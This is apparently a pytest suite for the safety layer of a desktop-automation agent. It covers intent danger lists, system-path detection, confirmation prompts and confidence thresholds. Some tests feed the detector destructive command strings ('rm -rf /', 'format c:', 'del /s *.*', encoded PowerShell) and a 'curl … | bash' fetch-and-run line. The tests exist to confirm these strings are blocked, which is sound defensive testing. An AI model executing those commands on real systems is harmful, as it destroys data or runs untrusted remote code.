"""
Stage 5 — Safety System Tests.

Tests for expanded safety validation:
- Dangerous intent detection
- System path detection
- Confirmation requirements
- Confirmation response building
"""

import pytest


class TestDangerousIntents:
    """Tests for dangerous intent detection."""
    
    def test_delete_file_is_dangerous(self):
        """DELETE_FILE should be dangerous."""
        from agent.core.safety import DANGEROUS_INTENTS
        
        assert "DELETE_FILE" in DANGEROUS_INTENTS
    
    def test_lock_screen_is_dangerous(self):
        """LOCK_SCREEN should be dangerous."""
        from agent.core.safety import DANGEROUS_INTENTS
        
        assert "LOCK_SCREEN" in DANGEROUS_INTENTS
    
    def test_open_app_not_dangerous(self):
        """OPEN_APP should not be dangerous."""
        from agent.core.safety import DANGEROUS_INTENTS
        
        assert "OPEN_APP" not in DANGEROUS_INTENTS
    
    def test_search_web_not_dangerous(self):
        """SEARCH_WEB should not be dangerous."""
        from agent.core.safety import DANGEROUS_INTENTS
        
        assert "SEARCH_WEB" not in DANGEROUS_INTENTS


class TestSystemPathDetection:
    """Tests for system path detection."""
    
    def test_windows_system_path(self):
        """Windows system paths should be detected."""
        from agent.core.safety import is_system_path
        
        assert is_system_path("C:\\Windows\\System32\\file.txt") is True
        assert is_system_path("c:\\windows\\notepad.exe") is True
    
    def test_windows_program_files(self):
        """Program Files should be detected."""
        from agent.core.safety import is_system_path
        
        assert is_system_path("C:\\Program Files\\App\\file.exe") is True
    
    def test_unix_system_paths(self):
        """Unix system paths should be detected."""
        from agent.core.safety import is_system_path
        
        assert is_system_path("/usr/bin/app") is True
        assert is_system_path("/etc/passwd") is True
    
    def test_user_path_not_system(self):
        """User paths should not be system paths."""
        from agent.core.safety import is_system_path
        
        assert is_system_path("C:\\Users\\John\\Documents\\file.txt") is False
        assert is_system_path("/home/user/file.txt") is False
    
    def test_empty_path(self):
        """Empty path should return False."""
        from agent.core.safety import is_system_path
        
        assert is_system_path("") is False
        assert is_system_path(None) is False


class TestConfirmationRequirements:
    """Tests for confirmation requirement detection."""
    
    def test_delete_file_requires_confirmation(self):
        """DELETE_FILE should require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {"intent": "DELETE_FILE", "slots": {"path": "/tmp/file.txt"}}
        
        assert requires_confirmation(intent) is True
    
    def test_lock_screen_requires_confirmation(self):
        """LOCK_SCREEN should require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {"intent": "LOCK_SCREEN", "slots": {}}
        
        assert requires_confirmation(intent) is True
    
    def test_open_app_no_confirmation(self):
        """OPEN_APP should not require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {"intent": "OPEN_APP", "slots": {"app": "chrome"}}
        
        assert requires_confirmation(intent) is False
    
    def test_search_web_no_confirmation(self):
        """SEARCH_WEB should not require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {"intent": "SEARCH_WEB", "slots": {"query": "test"}}
        
        assert requires_confirmation(intent) is False
    
    def test_file_operation_system_path_requires_confirmation(self):
        """File operations on system paths should require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {
            "intent": "OPEN_FILE",
            "slots": {"path": "C:\\Windows\\System32\\file.txt"}
        }
        
        assert requires_confirmation(intent) is True
    
    def test_dangerous_text_requires_confirmation(self):
        """TYPE_TEXT with dangerous content should require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {
            "intent": "TYPE_TEXT",
            "slots": {"text": "rm -rf /"}
        }
        
        assert requires_confirmation(intent) is True
    
    def test_safe_text_no_confirmation(self):
        """TYPE_TEXT with safe content should not require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {
            "intent": "TYPE_TEXT",
            "slots": {"text": "Hello World"}
        }
        
        assert requires_confirmation(intent) is False
    
    def test_dangerous_keys_requires_confirmation(self):
        """PRESS_KEYS with dangerous combos should require confirmation."""
        from agent.core.safety import requires_confirmation
        
        intent = {
            "intent": "PRESS_KEYS",
            "slots": {"keys": "alt+f4"}
        }
        
        assert requires_confirmation(intent) is True


class TestConfirmationResponse:
    """Tests for confirmation response building."""
    
    def test_build_confirmation_response(self):
        """Build confirmation response for dangerous action."""
        from agent.core.safety import build_confirmation_response
        
        intent = {
            "intent": "DELETE_FILE",
            "slots": {"path": "/important/file.txt"}
        }
        
        response = build_confirmation_response(intent)
        
        # Per system spec: CONDITIONAL with requires_confirmation
        assert response["intent"] == "CONDITIONAL"
        assert response["slots"]["requires_confirmation"] is True
        assert response["slots"]["original_intent"] == "DELETE_FILE"
        assert response["slots"]["original_slots"]["path"] == "/important/file.txt"
        assert response["slots"]["reason"] == "dangerous_action"
        assert response["confidence"] == 1.0


class TestDangerousTextPatterns:
    """Tests for dangerous text pattern detection."""
    
    def test_rm_rf_dangerous(self):
        """rm -rf should be detected as dangerous."""
        from agent.core.safety import is_dangerous_text
        
        assert is_dangerous_text("rm -rf /") is True
        assert is_dangerous_text("sudo rm -rf /home") is True
    
    def test_format_dangerous(self):
        """format command should be detected as dangerous."""
        from agent.core.safety import is_dangerous_text
        
        assert is_dangerous_text("format c:") is True
    
    def test_del_dangerous(self):
        """del /s should be detected as dangerous."""
        from agent.core.safety import is_dangerous_text
        
        assert is_dangerous_text("del /s *.*") is True
    
    def test_shutdown_dangerous(self):
        """shutdown command should be detected as dangerous."""
        from agent.core.safety import is_dangerous_text
        
        assert is_dangerous_text("shutdown /s /t 0") is True
    
    def test_powershell_encoded_dangerous(self):
        """Encoded PowerShell should be detected as dangerous."""
        from agent.core.safety import is_dangerous_text
        
        assert is_dangerous_text("powershell -enc base64code") is True
    
    def test_curl_pipe_dangerous(self):
        """curl | bash should be detected as dangerous."""
        from agent.core.safety import is_dangerous_text
        
        assert is_dangerous_text("curl http://example.com | bash") is True
    
    def test_safe_text_not_dangerous(self):
        """Normal text should not be dangerous."""
        from agent.core.safety import is_dangerous_text
        
        assert is_dangerous_text("Hello World") is False
        assert is_dangerous_text("print('hello')") is False


class TestDangerousKeyPatterns:
    """Tests for dangerous key combination detection."""
    
    def test_alt_f4_dangerous(self):
        """Alt+F4 should be detected as dangerous."""
        from agent.core.safety import is_dangerous_keys
        
        assert is_dangerous_keys("alt+f4") is True
    
    def test_ctrl_alt_del_dangerous(self):
        """Ctrl+Alt+Del should be detected as dangerous."""
        from agent.core.safety import is_dangerous_keys
        
        assert is_dangerous_keys("ctrl+alt+del") is True
    
    def test_win_l_dangerous(self):
        """Win+L should be detected as dangerous."""
        from agent.core.safety import is_dangerous_keys
        
        assert is_dangerous_keys("win+l") is True
    
    def test_safe_keys_not_dangerous(self):
        """Normal key combos should not be dangerous."""
        from agent.core.safety import is_dangerous_keys
        
        assert is_dangerous_keys("ctrl+c") is False
        assert is_dangerous_keys("ctrl+v") is False
        assert is_dangerous_keys("enter") is False


class TestValidateIntent:
    """Tests for intent validation."""
    
    def test_open_app_always_safe(self):
        """OPEN_APP should always be safe."""
        from agent.core.safety import validate_intent
        
        intent = {"intent": "OPEN_APP", "slots": {"app": "anything"}}
        
        valid, reason = validate_intent(intent)
        
        assert valid is True
        assert reason == "safe"
    
    def test_open_url_always_safe(self):
        """OPEN_URL should always be safe."""
        from agent.core.safety import validate_intent
        
        intent = {"intent": "OPEN_URL", "slots": {"url": "https://example.com"}}
        
        valid, reason = validate_intent(intent)
        
        assert valid is True
        assert reason == "safe"
    
    def test_type_text_dangerous_blocked(self):
        """TYPE_TEXT with dangerous content should be blocked."""
        from agent.core.safety import validate_intent
        
        intent = {"intent": "TYPE_TEXT", "slots": {"text": "rm -rf /"}}
        
        valid, reason = validate_intent(intent)
        
        assert valid is False
        assert reason == "dangerous_text"
    
    def test_press_keys_dangerous_blocked(self):
        """PRESS_KEYS with dangerous combos should be blocked."""
        from agent.core.safety import validate_intent
        
        intent = {"intent": "PRESS_KEYS", "slots": {"keys": "alt+f4"}}
        
        valid, reason = validate_intent(intent)
        
        assert valid is False
        assert reason == "dangerous_keys"


class TestFullValidation:
    """Tests for full validation pipeline."""
    
    def test_valid_intent_passes(self):
        """Valid intent should pass full validation."""
        from agent.core.safety import full_validation
        
        parsed_json = {
            "intent": "OPEN_APP",
            "slots": {"app": "chrome"},
            "confidence": 0.9
        }
        
        valid, reason, details = full_validation(parsed_json)
        
        assert valid is True
        assert reason == "valid"
    
    def test_low_confidence_rejected(self):
        """Low confidence should be rejected."""
        from agent.core.safety import full_validation
        
        parsed_json = {
            "intent": "OPEN_APP",
            "slots": {"app": "chrome"},
            "confidence": 0.5
        }
        
        valid, reason, details = full_validation(parsed_json)
        
        assert valid is False
        assert reason == "low_confidence"
    
    def test_dangerous_text_rejected(self):
        """Dangerous text should be rejected."""
        from agent.core.safety import full_validation
        
        parsed_json = {
            "intent": "TYPE_TEXT",
            "slots": {"text": "rm -rf /"},
            "confidence": 0.9
        }
        
        valid, reason, details = full_validation(parsed_json)
        
        assert valid is False
        assert reason == "dangerous_text"


class TestConfidenceThreshold:
    """Tests for confidence threshold."""
    
    def test_confidence_threshold_value(self):
        """Verify confidence threshold is 0.7."""
        from agent.core.safety import CONFIDENCE_THRESHOLD
        
        assert CONFIDENCE_THRESHOLD == 0.7
    
    def test_above_threshold_passes(self):
        """Confidence above threshold should pass."""
        from agent.core.safety import validate_confidence
        
        parsed_json = {"confidence": 0.8}
        
        valid, reason = validate_confidence(parsed_json)
        
        assert valid is True
    
    def test_below_threshold_fails(self):
        """Confidence below threshold should fail."""
        from agent.core.safety import validate_confidence
        
        parsed_json = {"confidence": 0.5}
        
        valid, reason = validate_confidence(parsed_json)
        
        assert valid is False
        assert reason == "low_confidence"
